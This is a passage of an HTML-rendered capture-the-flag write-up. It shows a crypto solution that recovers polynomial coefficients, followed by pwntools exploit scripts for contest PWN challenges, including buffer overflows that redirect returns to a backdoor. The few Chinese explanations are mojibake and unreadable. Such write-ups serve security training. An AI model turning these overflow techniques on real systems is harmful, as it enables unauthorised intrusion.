keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> proof_of_work<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>banner<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    parms <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>random<span class=\"token punctuation\">.</span>getrandbits<span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> </pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    res <span class=\"token operator\">=</span> res <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Give me x calculating f(x) :\\n> '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">if</span> res <span class=\"token operator\">>=</span> <span class=\"token number\">2</span><span class=\"token operator\">**</span><span class=\"token number\">32</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Give me something smaller.\\n\"</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>banner<span class=\"token operator\">+</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    cnt <span class=\"token operator\">=</span> <span class=\"token number\">0</span>  </pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        cnt <span class=\"token operator\">+=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">,</span>_<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>parms<span class=\"token punctuation\">[</span>_<span class=\"token punctuation\">]</span>  </pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>cnt<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    ans <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Give me Coefficients :\\n> '</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    ans <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>_<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> ans<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\",\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> </pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token keyword\">if</span> ans <span class=\"token operator\">==</span> parms<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Congrats! Your flag is:'</span><span class=\"token punctuation\">,</span>flag<span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token keyword\">except</span> Exception<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Something goes wrong...\\n\"</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>banner<span class=\"token operator\">+</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>Â§ßÁ≥ªÊï∞Âéª‰πòÔºåÁÑ∂Âêé‰ª• a+xb+x**2 *c = d</p>\n<p>‚Äã\t\t\t\t\t\t\t\td%x = a</p>\n<p>‚Äã\t\t\t\t\t\t\t\t(d-a)%x**2 = x*b</p>\n<p>‚Äã\t\t\t\t\t\t\t\tb=(d-a)%x**2/x</p>\n<p>ÊÄùÊÉ≥ÂéªÂÜôËÑöÊú¨</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">177754717040592981569551572031377340054191998150089284463636682539461200861660419277793044549808255858312075085076505728657329359128807787546446926703049420827644737041142510507604014302969048704502041579803985861076553232404872140427326979171833835167928462193868397362636669260261571017153010705552082170286101066366490706565697132560168077183348017264333167651710949131724270642891881280794067160062678045612036087150089948031521050726232296861427576086790342602842186707873382193949343692973498412664984895679933538279823670239965559948652106454011062316457810423425702426952467809946501500611115441733702708710521032114459847542665622625595031556945567463443773524673751241239124703927710925044937658332481442388137350163388181450227409991519320342433196040433371356835579779793698231120173813569544459871899939201083549425467819318395410861748062368483192273232471725365632400229155722855023939343540817517380575307485589891556485415820858077584894545989502703707116260404851070263159193834020747388870400998058161372220675478753848280221136901374387028849386044822121169476710769209034711358518243519469182938739564079866844787061356058699851567858225388803202946119417521003020418983989617334074034864880878802084304236313660</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>y <span class=\"token operator\">=</span> <span class=\"token number\">4294967295</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>coefficients <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">128</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">127</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    coefficients<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> c <span class=\"token operator\">//</span> <span class=\"token punctuation\">(</span>y<span class=\"token operator\">**</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    c <span class=\"token operator\">-=</span> coefficients<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>y<span class=\"token operator\">**</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>b <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">for</span> i<span class=\"token punctuation\">,</span> coef <span class=\"token keyword\">in</span> <span class=\"token builtin\">enumerate</span><span class=\"token punctuation\">(</span>coefficients<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    b<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>coef<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote Alg0r1thm_1s_s0_S1mpl3!=\"\">\n<p>sha256(XXXX+suYfKbD49Qo8nlg1) == ab021ffa2d6f8cc251b12fdec4ac9bce3d794230209d4aee1816e881a069e115<br>\nGive me XXXX: VXtD<br>\nRight!<br>\n||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||<br>\nGive me x calculating f(x) :</p>\n<blockquote>\n<p>4294967295<br>\n177754717040592981569551572031377340054191998150089284463636682539461200861660419277793044549808255858312075085076505728657329359128807787546446926703049420827644737041142510507604014302969048704502041579803985861076553232404872140427326979171833835167928462193868397362636669260261571017153010705552082170286101066366490706565697132560168077183348017264333167651710949131724270642891881280794067160062678045612036087150089948031521050726232296861427576086790342602842186707873382193949343692973498412664984895679933538279823670239965559948652106454011062316457810423425702426952467809946501500611115441733702708710521032114459847542665622625595031556945567463443773524673751241239124703927710925044937658332481442388137350163388181450227409991519320342433196040433371356835579779793698231120173813569544459871899939201083549425467819318395410861748062368483192273232471725365632400229155722855023939343540817517380575307485589891556485415820858077584894545989502703707116260404851070263159193834020747388870400998058161372220675478753848280221136901374387028849386044822121169476710769209034711358518243519469182938739564079866844787061356058699851567858225388803202946119417521003020418983989617334074034864880878802084304236313660<br>\nGive me Coefficients :<br>\n1876237120,626172452,1627047528,1148123460,1348630515,1698481812,1446873642,4042654229,4228750952,999297977,3552395832,2965839588,2993162711,2002311193,1338287959,2340833802,2036214335,1615808961,958146830,1952401696,492154317,1317385040,537277267,3393053693,3036404066,1167705348,2797839788,1251470952,1961291670,3182242798,3808389609,2352252557,3598388818,838095969,1866892340,2674355309,1376111052,3358914062,461352865,1783381454,1993597578,1271383177,2234587463,4081359548,1689410111,4067056375,3285718523,3734989195,2508740453,2862561332,4160217917,3484830478,429421860,2404102246,4187015464,3046521226,2522208042,2138126411,292726535,4003967769,461802762,2675027708,718837678,1568030890,2846503828,4282272406,4062505778,1981908433,1283603189,4113151761,1820754298,1778870069,180426342,2373682290,173348890,3732714533,1692672433,1383715836,3071388801,1699434732,2025585879,1856716817,1482988535,507687879,2114539938,2295960531,1034475256,661384657,265513629,2619999386,909106051,2930653276,3805388808,207958940,544893102,2414669217,3137837770,812512933,2668067210,3248501708,334422578,2748607715,1766441143,1581762636,3122895940,1933908340,160370242,1114312470,66011321,4239365568,891117060,3632701542,1469123062,2873832673,1246879161,3402226432,2484827592,528672899,196357980,210761372,2432808873,146191013,2292602129,1250087457,2599643068,3549592068,2887559002,731002342<br>\nCongrats! Your flag is: SYC</p>\n</blockquote>\n</blockquote>\n<h2 id=\"pwn\"><a class=\"markdownIt-Anchor\" href=\"#pwn\">#</a> PWN</h2>\n<h3 id=\"nc_pwntools\"><a class=\"markdownIt-Anchor\" href=\"#nc_pwntools\">#</a> nc_pwntools</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'pwn.node.game.sycsec.com'</span><span class=\"token punctuation\">,</span><span class=\"token number\">30573</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>s <span class=\"token operator\">=</span> <span class=\"token string\">b'\\x53\\x79\\x63\\x6c\\x6f\\x76\\x65\\x72'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>pl <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token operator\">-</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> s</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'2.This challenge is harder than first one\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>equ <span class=\"token operator\">=</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>result <span class=\"token operator\">=</span> <span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>equ<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"password\"><a class=\"markdownIt-Anchor\" href=\"#password\">#</a> password</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">.</span>terminal <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'tmux'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'splitw'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'-h'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>res <span class=\"token operator\">=</span> <span class=\"token string\">b'Wrong'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token string\">b'Wrong'</span> <span class=\"token keyword\">in</span> res<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    io <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'pwn.node.game.sycsec.com'</span><span class=\"token punctuation\">,</span><span class=\"token number\">30726</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token comment\"># io = process('./password')</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    io<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'name:\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x04012F3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    io<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'please enter password:\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    io<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token comment\"># sleep(0.1)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    res <span class=\"token operator\">=</span> io<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token string\">b'Correct'</span> <span class=\"token keyword\">in</span> res<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        io<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"ret2text\"><a class=\"markdownIt-Anchor\" href=\"#ret2text\">#</a> ret2text</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./ret2text'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># r = remote('pwn.node.game.sycsec.com',30691)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">debug</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'ret2text'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>lic \t<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> lenth              <span class=\"token punctuation\">:</span><span class=\"token string\">b'Yhuan'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth<span class=\"token operator\">//</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'Y'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>pad <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">9</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>backdoor <span class=\"token operator\">=</span> <span class=\"token string\">b'\\x27\\x52'</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>pl1 <span class=\"token operator\">=</span> pad <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> backdoor</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>se<span class=\"token punctuation\">(</span>pl1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"write1\"><a class=\"markdownIt-Anchor\" href=\"#write1\">#</a> write1</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>r <span class=\"token operator\">=</span> gdb<span class=\"token punctuation\">.</span>debug<span class=\"token punctuation\">(</span><span class=\"token string\">'./chal'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># r = remote('pwn.node.game.sycsec.com',30157)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td 